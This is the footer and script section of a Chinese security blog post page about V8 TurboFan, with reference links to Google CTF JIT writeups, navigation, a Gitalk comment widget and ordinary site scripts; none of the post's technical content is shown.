<li><a href="https://mem2019.github.io/jekyll/update/2019/08/09/Google-CTF-2018-Final-JIT.html" target="_blank" rel="noopener">Why I failed to trigger Bound Check Elimination in Google CTF 2018 Final JIT</a></li>
<li><a href="https://xz.aliyun.com/t/3348?spm=5176.12901015.0.i12901015.1bc1525cy9bvzk" target="_blank" rel="noopener">Google CTF justintime writeup - 先知社区</a></li>
</ol>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2021/01/v8-turboFan/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/v8/" rel="tag">v8</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2021/01/CVE-2021-3156/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            CVE-2021-3156分析
          
        </div>
      </a>
    
    
      <a href="/2020/12/secLab-CodeQL-learning/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">深入学习CodeQL by security_lab</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>